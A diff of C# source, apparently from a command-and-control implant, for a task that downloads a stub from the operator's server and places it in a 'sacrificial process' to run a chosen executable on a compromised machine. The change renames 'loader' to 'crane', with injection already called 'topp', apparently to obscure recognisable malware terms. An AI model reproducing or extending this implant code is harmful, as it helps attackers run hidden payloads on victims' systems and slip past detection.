@@ -40,8 +40,8 @@ namespace Tasks
             public string PEName;
             [DataMember(Name = "commandline")]
             public string CommandLine;
-            [DataMember(Name = "loader_stub_id")]
-            public string LoaderStubId;
+            [DataMember(Name = "crane_stub_id")]
+            public string craneStubId;
             [DataMember(Name = "pe_id")]
             public string PeId;
         }
@@ -158,7 +158,7 @@ namespace Tasks
                 DebugHelp.DebugWriteLine($"Executable name: {parameters.PEName}");
                 DebugHelp.DebugWriteLine($"Process command line: {parameters.CommandLine}");
 
-                if (string.IsNullOrEmpty(parameters.LoaderStubId) || string.IsNullOrEmpty(parameters.PEName) || string.IsNullOrEmpty(parameters.PipeName))
+                if (string.IsNullOrEmpty(parameters.craneStubId) || string.IsNullOrEmpty(parameters.PEName) || string.IsNullOrEmpty(parameters.PipeName))
                 {
                     throw new ArgumentNullException($"One or more required arguments was not provided.");
                 }
@@ -181,9 +181,9 @@ namespace Tasks
                     throw new InvalidOperationException($"{parameters.PEName} has a zero length (have you registered it?)");
                 }
 
-                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exePEPic))
+                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.craneStubId, out byte[] exePEPic))
                 {
-                    throw new InvalidOperationException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId}");
+                    throw new InvalidOperationException($"Failed to download assembly crane stub (with id: {parameters.craneStubId}");
                 }
 
                 ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
@@ -214,7 +214,7 @@ namespace Tasks
                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "topping stub..."));
                 if (!proc.topp(exePEPic))
                 {
-                    throw new Exception($"Failed to topp loader into sacrificial process {info.Application}.");
+                    throw new Exception($"Failed to topp crane into sacrificial process {info.Application}.");
                 }
 
                 _agent.GetTaskManager().AddTaskResponseToQueue(
